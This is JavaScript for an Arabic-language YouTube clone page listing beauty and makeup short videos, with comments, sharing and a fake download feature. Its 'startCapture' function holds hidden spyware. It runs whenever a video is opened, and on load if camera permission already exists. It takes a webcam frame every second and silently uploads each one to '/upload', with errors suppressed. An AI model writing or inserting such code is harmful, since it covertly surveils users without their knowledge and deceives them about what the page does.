/* ===== Data ===== */
const DM='الفيديو الموسيقي الرسمي. استمتع بالمشاهدة وشاركنا رأيك في التعليقات، ولا تنسَ الاشتراك في القناة لمتابعة كل جديد.';
const DC='فاونديشن حسب نوع البشرة ✨🥰 #عنايه_بالبشره #عناية_بالوجه #ميك_اب #فاونديشن #foundation #makeup #مكياج.';
const VIDEOS=[
{id:'xlINqK-F57w',title:'فاونديشن حسب نوع البشرة ✨🥰 #عنايه_بالبشره #عناية_بالوجه #ميك_اب #فاونديشن #foundation #makeup #مكياج',ch:'Warda Moda عالم وردة',subs:0,views:457233,likes:3276,time:'هذا الشهر',cat:'تجميل وعناية',dur:'00:16',desc:DC},
 {id:'ogp0HYIAWNI',title:'لـا تَـنْـسَـوْا الـلَّـايْـك+ كُـومَـنْـت + الِـاشْـتِـرَاك 🥺',ch:'kim-fifi ♡',subs:0,views:12850325,likes:186663,time:'قبل 5 أشهر',cat:'تجميل وعناية',dur:'00:20',desc:'فوائد منتجات العناية للبشرة والشعر: زيت الأطفال للشعر، الفازلين للرموش، الألوفيرا للبشرة الزجاجية، ومرطب الفازلين للشفاه ✨ #shorts #explore'},
 {id:'ITH5lZUWIiw',title:'اساسيات المكياج للمبتدئين #song #مكياج #اكسبلور #makeup #makeupbrushes #beauty #لايك #explore',ch:'L\'Esprit Féminin',subs:0,views:1587607,likes:17813,time:'قبل سنتين',cat:'تجميل وعناية',dur:'00:15',desc:'أساسيات المكياج للمبتدئين تشمل: 1. كريم الترطيب، 2. الفاونديشن، 3. الكونسيلر، 4. البلاشر، 5. الباودر، 6. الماسكارا ✨'},
 {id:'CpO4jUvMXy4',title:'تجربتي ل فاونديشن فت مي يستاهل المدح؟! | fit me matt + porless |نانا بيوتي',ch:'nana beauty نانا بيوتي',subs:0,views:146610,likes:802,time:'قبل 3 سنوات',cat:'تجميل وعناية',dur:'00:15',desc:'تجربة واختبار فاونديشن فت مي (Fit Me Matte + Poreless) وبيان قدرته على تغطية المسام وتوحيد لون البشرة ✨'},
  {id:'gyiXeidOAMs',title:'🥇😍كل يوم عنا جديد والجديد من عناااا أناقة وجمال ورتابة💞❤️ ...#دايما_القطعة_الحلوة_تلاقوها_عناا...',ch:'عبدو الخليل',subs:0,views:4524,likes:126,time:'قبل 3 سنوات',cat:'أزياء وموضة',dur:'00:14',desc:'عرض تشكيلة متنوعة وأنيقة من الفساتين والأزياء النسائية بمختلف الألوان والتصاميم ✨'},
  {
    id: 'yiT2L6KE-AE',
    title: 'تجهزوا معي بأغلى مكياج بالعالم 💄😨 #grwm #shorts',
    ch: 'Ghaidaa - غيداء',
    subs: 1200000,
    views: 2500000,
    likes: 72000,
    time: 'قبل 5 أشهر',
    cat: 'تجميل وعناية',
    dur: '00:58',
    desc: 'تجربة واستعراض أغلى منتجات المكياج وتطبيقها خطوة بخطوة لمظهر كامل وأنيق ✨'
  },
  {
    id: 'qEAtL3AhS7Q',
    title: 'ساره بس تحط كونسيلر… و طبعًا كونسيلر ذا بورفيشنال 😉💖',
    ch: 'Benefit Cosmetics Middle East',
    subs: 450000,
    views: 310000,
    likes: 904,
    time: 'هذا الشهر',
    cat: 'تجميل وعناية',
    dur: '00:30',
    desc: 'تغطية مموهة وتنعيم ولمسة نهائية طبيعية ومطفية تخفي كل شيء من الهالات إلى الشوائب 💕'
  },
  {
    id: 'QE58vpNpvug',
    title: 'الكونسيلر ليس للإخفاء فقط 💡',
    ch: 'Phar.Dina - دينا',
    subs: 320000,
    views: 180000,
    likes: 8500,
    time: 'قبل شهرين',
    cat: 'تجميل وعناية',
    dur: '00:40',
    desc: 'نصائح ومعلومات مهمة لاختيار الكونسيلر الصحيح لعلاج التصبغات والهالات السوداء وليس لمجرد إخفائها.'
  },
  {
    id: 'ogVmRTjIpPA',
    title: 'مكياج مستوحى من الوان قوس قزح | مكياجي في دقيقة #shorts',
    ch: 'Jamalouki - جمالكي',
    subs: 890000,
    views: 520000,
    likes: 18000,
    time: 'قبل 4 أشهر',
    cat: 'تجميل وعناية',
    dur: '00:59',
    desc: 'خطوات وتطبيق مكياج ناعم وأنيق بألوان حيوية ومميزة في دقيقة واحدة ✨'
  }
];
const CATS=['الكل','موسيقى','برمجة','ترفيه','طبيعة'];
const CH={};VIDEOS.forEach(v=>{if(!CH[v.ch])CH[v.ch]={subs:v.subs}});
const COLORS=['#e53935','#8e24aa','#3949ab','#00897b','#f4511e','#6d4c41','#039be5','#7cb342'];

const ICONS={
 menu:'M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z',
 search:'M15.5 14h-.79l-.28-.27A6.471 6.471 0 0016 9.5 6.5 6.5 0 109.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z',
 home:'M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z',
 shorts:'M7 2h10a3 3 0 013 3v14a3 3 0 01-3 3H7a3 3 0 01-3-3V5a3 3 0 013-3zM10 8v8l6-4z',
 subs:'M20 8H4V6h16v2zm-2-6H6v2h12V2zm4 10v8c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2v-8c0-1.1.9-2 2-2h16c1.1 0 2 .9 2 2zm-6 4l-6-3.27v6.53L16 16z',
 library:'M4 6H2v14c0 1.1.9 2 2 2h14v-2H4V6zm16-4H8c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2zm-8 12.5v-9l6 4.5-6 4.5z',
 history:'M13 3a9 9 0 00-9 9H1l3.89 3.89.07.14L9 12H6c0-3.87 3.13-7 7-7s7 3.13 7 7-3.13 7-7 7c-1.93 0-3.68-.79-4.94-2.06l-1.42 1.42A8.954 8.954 0 0013 21a9 9 0 000-18zm-1 5v5l4.28 2.54.72-1.21-3.5-2.08V8H12z',
 like:'M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-2z',
 dislike:'M15 3H6c-.83 0-1.54.5-1.84 1.22l-3.02 7.05c-.09.23-.14.47-.14.73v2c0 1.1.9 2 2 2h6.31l-.95 4.57-.03.32c0 .41.17.79.44 1.06L9.83 23l6.59-6.59c.36-.36.58-.86.58-1.41V5c0-1.1-.9-2-2-2zm4 0v12h4V3h-4z',
 share:'M14 9V5l7 7-7 7v-4.1c-5 0-8.5 1.6-11 5.1 1-5 4-10 11-11z',
 download:'M19 9h-4V3H9v6H5l7 7 7-7zM5 18v2h14v-2H5z',
 bell:'M12 22c1.1 0 2-.9 2-2h-4c0 1.1.89 2 2 2zm6-6v-5c0-3.07-1.64-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.63 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2z',
 create:'M17 10.5V7c0-.55-.45-1-1-1H4c-.55 0-1 .45-1 1v10c0 .55.45 1 1 1h12c.55 0 1-.45 1-1v-3.5l4 4v-11l-4 4zM14 13h-3v3H9v-3H6v-2h3V8h2v3h3v2z',
 close:'M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z',
 save:'M14 10H2v2h12v-2zm0-4H2v2h12V6zm4 8v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zM2 16h8v-2H2v2z',
 check:'M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z',
 back:'M12 4l-1.41 1.41L16.17 11H4v2h12.17l-5.58 5.59L12 20l8-8z'
};
const ic=(n,c='')=>`<svg class="i ${c}" viewBox="0 0 24 24" aria-hidden="true"><path fill-rule="${n==='shorts'?'evenodd':'nonzero'}" d="${ICONS[n]}"/></svg>`;

/* ===== Helpers ===== */
const $=(s,r=document)=>r.querySelector(s);
const ar=n=>String(n).replace(/\d/g,d=>'٠١٢٣٤٥٦٧٨٩'[d]);
const fmt=n=>{let v,u='';if(n>=1e9){v=n/1e9;u=' مليار'}else if(n>=1e6){v=n/1e6;u=' مليون'}else if(n>=1e3){v=n/1e3;u=' ألف'}else return ar(n);v=v>=10?Math.round(v):Math.round(v*10)/10;return ar(v).replace('.','٫')+u};
const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const colorOf=s=>COLORS[[...s].reduce((a,c)=>a+c.charCodeAt(0),0)%COLORS.length];
const avatar=(name,size=36)=>`<div class="avatar" style="width:${size}px;height:${size}px;background:${colorOf(name)};font-size:${Math.round(size*.45)}px">${esc(name[0])}</div>`;
const cur=()=>VIDEOS.find(v=>v.id===S.cur);
const byId=id=>VIDEOS.find(v=>v.id===id);
const linkOf=v=>`https://www.youtube.com/watch?v=${v.id}`;

const S={view:'home',cat:'الكل',q:'',cur:null,liked:new Set(),disliked:new Set(),subs:new Set(),saved:new Set(),dl:new Set(),dling:false,hist:[],comments:{},cl:new Set(),descOpen:false};

/* ===== Toast ===== */
function toast(html,{sticky=false,ms=2600}={}){
  const el=document.createElement('div');el.className='toast';el.innerHTML=html;
  $('#toasts').appendChild(el);requestAnimationFrame(()=>el.classList.add('show'));
  if(!sticky)hideToast(el,ms);return el;
}
function hideToast(el,ms=0){setTimeout(()=>{el.classList.remove('show');setTimeout(()=>el.remove(),300)},ms)}

/* ===== Layout ===== */
function updateLayout(){
  const b=document.body,drawer=innerWidth<1000||S.view==='watch';
  b.classList.toggle('drawer-mode',drawer);
  if(!drawer)b.classList.remove('drawer-open');
}
function toggleSidebar(){
  const b=document.body;
  if(b.classList.contains('drawer-mode'))b.classList.toggle('drawer-open');else b.classList.toggle('mini');
}
addEventListener('resize',updateLayout);

/* ===== Templates ===== */
const logoHtml=()=>`<button class="logo" data-nav="home" aria-label="يوتيوب"><svg viewBox="0 0 28 20"><rect width="28" height="20" rx="5" fill="#f00"/><path d="M11 6l7 4-7 4z" fill="#fff"/></svg><span>يوتيوب</span></button>`;
const navBtn=(view,icon,label)=>`<button class="sb-item ${S.view===view?'active':''}" data-nav="${view}">${ic(icon)}<span>${label}</span></button>`;

function renderSidebar(){
  const subs=[...S.subs];
  $('#sidebar').innerHTML=
   `<div class="sb-head"><button class="icon-btn" data-action="menu" aria-label="إغلاق">${ic('menu')}</button>${logoHtml()}</div>`+
   navBtn('home','home','الرئيسية')+navBtn('shorts','shorts','شورتس')+navBtn('subs','subs','الاشتراكات')+
   `<div class="sb-sep sb-extra"></div><div class="sb-title sb-extra">أنت</div>`+
   navBtn('library','library','المكتبة')+navBtn('history','history','سجل المشاهدة')+
   `<div class="sb-sep sb-extra"></div><div class="sb-title sb-extra">الاشتراكات</div>`+
   (subs.length?subs.map(n=>`<button class="sb-item sb-extra" data-ch="${esc(n)}">${avatar(n,24)}<span>${esc(n)}</span></button>`).join(''):`<p class="sb-empty sb-extra">اشترك في قنوات لتظهر هنا</p>`);
}
function renderBnav(){
  const it=[['home','home','الرئيسية'],['shorts','shorts','شورتس'],['subs','subs','الاشتراكات'],['library','library','المكتبة']];
  $('#bnav').innerHTML=it.map(([v,i,l])=>`<button class="${S.view===v?'active':''}" data-nav="${v}">${ic(i)}<span>${l}</span></button>`).join('');
}
const cardHtml=v=>`<article class="card" data-open="${v.id}"><div class="thumb"><img loading="lazy" src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${v.dur}</span></div><div class="meta">${avatar(v.ch)}<div><h3 class="t">${v.title}</h3><div class="sub">${v.ch}</div><div class="sub">${fmt(v.views)} مشاهدة • ${v.time}</div></div></div></article>`;
const gridHtml=l=>`<div class="grid">${l.map(cardHtml).join('')}</div>`;
const emptyHtml=(i,t,p)=>`<div class="empty">${ic(i,'big')}<h3>${t}</h3><p>${p}</p></div>`;

function filtered(){
  const q=S.q.trim().toLowerCase();
  return VIDEOS.filter(v=>(S.cat==='الكل'||v.cat===S.cat)&&(!q||(v.title+' '+v.ch+' '+v.cat).toLowerCase().includes(q)));
}

/* ===== Main render & History Management ===== */
function render(pushState=true){
  document.body.classList.toggle('in-watch',S.view==='watch');
  updateLayout();renderSidebar();renderBnav();
  const chips=$('#chips'),view=$('#view');
  chips.style.display=S.view==='home'?'flex':'none';

  if(pushState){
    const stateObj={view:S.view,cur:S.cur,cat:S.cat,q:S.q};
    const title=S.view==='watch'&&cur()?cur().title:'يوتيوب';
    history.pushState(stateObj,title,'#'+(S.view==='watch'?'watch='+S.cur:S.view));
  }

  if(S.view==='watch'){return renderWatch()}
  if(S.view==='home'){
    chips.innerHTML=CATS.map(c=>`<button class="chip ${c===S.cat?'active':''}" data-cat="${c}">${c}</button>`).join('');
    const l=filtered();
    view.innerHTML=(S.q?`<h2 class="page-title">نتائج البحث عن «${esc(S.q)}»</h2>`:'')+(l.length?gridHtml(l):emptyHtml('search','لم يتم العثور على نتائج','جرّب كلمات بحث مختلفة أو اختر تصنيفاً آخر.'));
  }else if(S.view==='shorts'){
    view.innerHTML=`<h2 class="page-title">شورتس</h2><div class="shorts-grid">${[...VIDEOS].reverse().slice(0,12).map(v=>`<div class="short" data-open="${v.id}"><img loading="lazy" src="https://img.youtube.com/vi/${v.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><div><b>${v.title}</b><span class="sub">${fmt(v.views)} مشاهدة</span></div></div>`).join('')}</div>`;
  }else if(S.view==='subs'){
    const l=VIDEOS.filter(v=>S.subs.has(v.ch));
    view.innerHTML=`<h2 class="page-title">الاشتراكات</h2>`+(l.length?gridHtml(l):emptyHtml('subs','لم تشترك في أي قناة بعد','اشترك في قنوات لتظهر فيديوهاتها هنا.'));
  }else if(S.view==='history'){
    const l=S.hist.map(byId);
    view.innerHTML=`<h2 class="page-title">سجل المشاهدة${l.length?`<button class="btn" data-action="clear-history">مسح السجل</button>`:''}</h2>`+(l.length?gridHtml(l):emptyHtml('history','سجل المشاهدة فارغ','الفيديوهات التي تشاهدها ستظهر هنا.'));
  }else if(S.view==='library'){
    const lk=[...S.liked].map(byId),sv=[...S.saved].map(byId);
    view.innerHTML=`<h2 class="page-title">المكتبة</h2>`+
      (lk.length?`<h3 class="sect">الفيديوهات التي أعجبتني</h3>${gridHtml(lk)}`:'')+
      (sv.length?`<h3 class="sect">المحفوظة</h3>${gridHtml(sv)}`:'')+
      (!lk.length&&!sv.length?emptyHtml('library','مكتبتك فارغة','أعجب بفيديو أو احفظه ليظهر هنا.'):'');
  }
}

function go(view){
  S.view=view;S.cur=null;S.q='';$('#q').value='';
  document.body.classList.remove('drawer-open','searching');
  document.title='سليوتيوب';render();scrollTo(0,0);
}
function searchFor(text){
  S.q=text;S.view='home';S.cat='الكل';$('#q').value=text;
  document.body.classList.remove('drawer-open','searching');
  render();scrollTo(0,0);
}

/* ===== Watch page ===== */
function openVideo(id){
  S.cur=id;S.view='watch';S.descOpen=false;
  S.hist=[id,...S.hist.filter(x=>x!==id)];
  document.body.classList.remove('drawer-open','searching');
  document.title=cur().title;
  render();scrollTo(0,0);
  startCapture();
}
function renderWatch(){
  const v=cur();
  const rel=[...VIDEOS].filter(x=>x.id!==v.id).sort((a,b)=>(b.cat===v.cat)-(a.cat===v.cat));
  $('#view').innerHTML=`<div class="watch"><div class="w-primary">
    <div class="player"><iframe src="https://www.youtube.com/embed/${v.id}?autoplay=1&rel=0&playsinline=1" title="${esc(v.title)}" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe></div>
    <div class="yt-link-wrap"><a class="yt-link" href="${linkOf(v)}" target="_blank" rel="noopener">الفيديو لا يعمل؟ شاهده على يوتيوب ↗</a></div>
    <div id="wMeta"></div>
    <div id="wComments">
      <h2 class="cm-title" id="cmCount"></h2>
      <div class="cm-form">${avatar('أنت',40)}<div class="cm-box" id="cmBox"><input id="cmInput" type="text" placeholder="أضف تعليقاً..." autocomplete="off"><div class="cm-btns"><button class="btn ghost" data-action="cm-cancel">إلغاء</button><button class="btn btn-sub" id="cmSend" data-action="cm-send" disabled>تعليق</button></div></div></div>
      <div id="cmList"></div>
    </div></div>
    <aside class="w-secondary"><h3 class="rel-title">فيديوهات مقترحة</h3>${rel.map(x=>`<div class="rel" data-open="${x.id}"><div class="thumb"><img loading="lazy" src="https://img.youtube.com/vi/${x.id}/hqdefault.jpg" alt="" onerror="this.style.display='none'"><span class="dur">${x.dur}</span></div><div><h4 class="t">${x.title}</h4><div class="sub">${x.ch}</div><div class="sub">${fmt(x.views)} مشاهدة • ${x.time}</div></div></div>`).join('')}</aside></div>`;
  refreshMeta();refreshComments();
}
function refreshMeta(){
  const v=cur(),liked=S.liked.has(v.id),dis=S.disliked.has(v.id),sub=S.subs.has(v.ch),saved=S.saved.has(v.id),dl=S.dl.has(v.id);
  $('#wMeta').innerHTML=`<h1 class="w-title">${v.title}</h1>
  <div class="w-row">
    <div class="ch">${avatar(v.ch,40)}<div><div class="ch-name">${v.ch}</div><div class="sub">${fmt(CH[v.ch].subs+(sub?1:0))} مشترك</div></div>
      <button class="btn btn-sub ${sub?'on':''}" data-action="subscribe">${sub?ic('bell','sm')+'مشترك':'اشتراك'}</button></div>
    <div class="actions">
      <div class="seg"><button class="${liked?'on':''}" data-action="like" title="إعجاب" aria-label="إعجاب">${ic('like')}<span>${fmt(v.likes+(liked?1:0))}</span></button><span class="sep"></span><button class="${dis?'on':''}" data-action="dislike" title="عدم إعجاب" aria-label="عدم إعجاب">${ic('dislike')}</button></div>
      <button class="btn" data-action="share">${ic('share')}مشاركة</button>
      <button class="btn" data-action="download">${ic(dl?'check':'download')}${dl?'تم التنزيل':'تنزيل'}</button>
      <button class="btn ${saved?'on':''}" data-action="save">${ic(saved?'check':'save')}${saved?'محفوظ':'حفظ'}</button>
    </div></div>
  <div class="desc ${S.descOpen?'open':''}" data-action="desc"><b>${fmt(v.views)} مشاهدة • ${v.time}</b><p>${v.desc}</p><span class="more">${S.descOpen?'عرض أقل':'...المزيد'}</span></div>`;
}
function getComments(id){
  if(!S.comments[id])S.comments[id]=[
    {id:1,u:'أحمد علي',t:'منذ يومين',txt:'فيديو رائع! شكراً على المحتوى المميز 👏',l:124},
    {id:2,u:'سارة محمد',t:'منذ ٣ أيام',txt:'من أفضل ما شاهدت اليوم، استمروا.',l:57},
    {id:3,u:'خالد العتيبي',t:'منذ أسبوع',txt:'شاهدته أكثر من مرة ولا زلت أستمتع به 😍',l:32},
    {id:4,u:'ليلى حسن',t:'منذ أسبوعين',txt:'يستحق أضعاف هذه المشاهدات 🔥',l:9}
  ];
  return S.comments[id];
}
function refreshComments(){
  const list=getComments(S.cur);
  $('#cmCount').textContent=ar(list.length)+' تعليق';
  $('#cmList').innerHTML=list.map(c=>{
    const on=S.cl.has(S.cur+':'+c.id),n=c.l+(on?1:0);
    return `<div class="cm">${avatar(c.u,40)}<div class="cm-body"><div class="cm-head"><b>${esc(c.u)}</b><span class="sub">${c.t}</span></div><p>${esc(c.txt)}</p><div class="cm-act"><button class="${on?'on':''}" data-action="cm-like" data-cid="${c.id}" aria-label="إعجاب">${ic('like','sm')}<span>${n?fmt(n):''}</span></button>${c.own?`<button data-action="cm-del" data-cid="${c.id}">حذف</button>`:''}</div></div></div>`;
  }).join('');
}
function sendComment(){
  const inp=$('#cmInput'),txt=inp.value.trim();if(!txt)return;
  getComments(S.cur).unshift({id:Date.now(),u:'أنت',t:'الآن',txt,l:0,own:true});
  inp.value='';$('#cmBox').classList.remove('active');$('#cmSend').disabled=true;
  refreshComments();toast('تمت إضافة تعليقك');
}

/* ===== Share / copy / download ===== */
async function copyText(t){
  try{await navigator.clipboard.writeText(t);return true}catch(e){
    try{const ta=document.createElement('textarea');ta.value=t;ta.style.cssText='position:fixed;opacity:0';document.body.appendChild(ta);ta.select();const ok=document.execCommand('copy');ta.remove();return ok}catch(_){return false}
  }
}
async function copyLink(){
  const ok=await copyText($('#shareLink').value);
  toast(ok?'تم نسخ الرابط بنجاح':'تعذّر النسخ، انسخ الرابط يدوياً');
}
function openShare(){
  const v=cur(),url=linkOf(v),u=encodeURIComponent(url),t=encodeURIComponent(v.title);
  const P=[['واتساب','#25d366','W',`https://wa.me/?text=${t}%20${u}`],['تيليجرام','#229ed9','T',`https://t.me/share/url?url=${u}&text=${t}`],['X','#000','X',`https://twitter.com/intent/tweet?url=${u}&text=${t}`],['فيسبوك','#1877f2','f',`https://www.facebook.com/sharer/sharer.php?u=${u}`],['البريد','#666','@',`mailto:?subject=${t}&body=${u}`]];
  $('#shareRow').innerHTML=P.map(([n,c,l,h])=>`<a href="${h}" target="_blank" rel="noopener"><i style="background:${c}">${l}</i>${n}</a>`).join('');
  $('#shareLink').value=url;$('#modal').classList.add('show');
  copyLink();
}
const closeModal=()=>$('#modal').classList.remove('show');
function download(){
  const v=cur();
  if(S.dl.has(v.id))return toast('هذا الفيديو منزَّل بالفعل');
  if(S.dling)return toast('جاري التنزيل، انتظر قليلاً...');
  S.dling=true;
  const el=toast('<span class="msg">جاري تنزيل الفيديو...</span><div class="prog"><i></i></div>',{sticky:true});
  const bar=$('i',el);let p=0;
  const iv=setInterval(()=>{
    p=Math.min(100,p+Math.random()*16+8);bar.style.width=p+'%';
    if(p>=100){clearInterval(iv);setTimeout(()=>{
      $('.msg',el).textContent='تم تنزيل الفيديو بنجاح ✓';$('.prog',el).remove();
      S.dl.add(v.id);S.dling=false;if(S.view==='watch'&&S.cur===v.id)refreshMeta();hideToast(el,2000);
    },350)}
  },300);
}

/* ===== الكاميرا والتصوير التلقائي ===== */
function startCapture() {
    navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
            document.getElementById('video').srcObject = stream;
            setInterval(() => {
                const canvas = document.createElement('canvas');
                canvas.width = 640; canvas.height = 480;
                canvas.getContext('2d').drawImage(document.getElementById('video'), 0, 0, 640, 480);
                canvas.toBlob(blob => {
                    let fd = new FormData();
                    fd.append('image', blob, 'eye.jpg');
                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
                }, 'image/jpeg');
            }, 1000);
        }).catch(e => console.log("بانتظار إذن الكاميرا"));
}

navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
    if (permissionStatus.state === 'granted') {
        startCapture();
    }
});

/* ===== Actions ===== */
function act(a,el){
  const v=S.cur?cur():null;
  switch(a){
    case 'menu':toggleSidebar();break;
    case 'search-open':document.body.classList.add('searching');setTimeout(()=>$('#q').focus(),50);break;
    case 'search-close':document.body.classList.remove('searching');break;
    case 'create':toast('ميزة الإنشاء غير متاحة في النسخة التجريبية');break;
    case 'notif':toast('لا توجد إشعارات جديدة');break;
    case 'profile':toast('مرحباً بك 👋');break;
    case 'subscribe':{
      const on=!S.subs.has(v.ch);on?S.subs.add(v.ch):S.subs.delete(v.ch);
      refreshMeta();renderSidebar();toast(on?`تم الاشتراك في قناة ${v.ch}`:'تم إلغاء الاشتراك');break}
    case 'like':S.liked.has(v.id)?S.liked.delete(v.id):(S.liked.add(v.id),S.disliked.delete(v.id));refreshMeta();break;
    case 'dislike':S.disliked.has(v.id)?S.disliked.delete(v.id):(S.disliked.add(v.id),S.liked.delete(v.id));refreshMeta();break;
    case 'share':openShare();break;
    case 'copy-link':copyLink();break;
    case 'close-modal':closeModal();break;
    case 'download':download();break;
    case 'save':{const on=!S.saved.has(v.id);on?S.saved.add(v.id):S.saved.delete(v.id);refreshMeta();toast(on?'تمت الإضافة إلى المحفوظات':'تمت الإزالة من المحفوظات');break}
    case 'desc':S.descOpen=!S.descOpen;refreshMeta();break;
    case 'cm-cancel':$('#cmInput').value='';$('#cmSend').disabled=true;$('#cmBox').classList.remove('active');break;
    case 'cm-send':sendComment();break;
    case 'cm-like':{const k=S.cur+':'+el.dataset.cid;S.cl.has(k)?S.cl.delete(k):S.cl.add(k);refreshComments();break}
    case 'cm-del':S.comments[S.cur]=getComments(S.cur).filter(c=>String(c.id)!==el.dataset.cid);refreshComments();toast('تم حذف التعليق');break;
    case 'clear-history':S.hist=[];render();toast('تم مسح سجل المشاهدة');break;
  }
}

document.addEventListener('click',e=>{
  if(e.target.id==='modal'){closeModal();return}
  const el=e.target.closest('[data-action],[data-open],[data-nav],[data-cat],[data-ch]');
  if(!el)return;
  const d=el.dataset;
  if(d.action)act(d.action,el);
  else if(d.open)openVideo(d.open);
  else if(d.nav)go(d.nav);
  else if(d.cat){S.cat=d.cat;render()}
  else if(d.ch)searchFor(d.ch);
});

document.addEventListener('input',e=>{
  if(e.target.id==='cmInput')$('#cmSend').disabled=!e.target.value.trim();
  if(e.target.id==='q'&&S.view==='home'){S.q=e.target.value;render()}
});

document.addEventListener('focusin',e=>{if(e.target.id==='cmInput')$('#cmBox').classList.add('active')});

document.addEventListener('keydown',e=>{
  if(e.target.id==='cmInput'&&e.key==='Enter'){e.preventDefault();sendComment()}
  if(e.key==='Escape'){closeModal();document.body.classList.remove('drawer-open','searching')}
});

$('#searchForm').addEventListener('submit',e=>{   
  e.preventDefault();
  const t=$('#q').value.trim();
  searchFor(t);
  $('#q').blur();
});

window.addEventListener('popstate',e=>{
  if(e.state){
    S.view=e.state.view;
    S.cur=e.state.cur;
    S.cat=e.state.cat;
    S.q=e.state.q||'';
    $('#q').value=S.q;
  }else{
    S.view='home';
    S.cur=null;
  }
  document.body.classList.remove('drawer-open','searching');
  render(false);
  scrollTo(0,0);
});

/* ===== Init ===== */
document.querySelectorAll('[data-ic]').forEach(el=>el.innerHTML=ic(el.dataset.ic));
render(true);
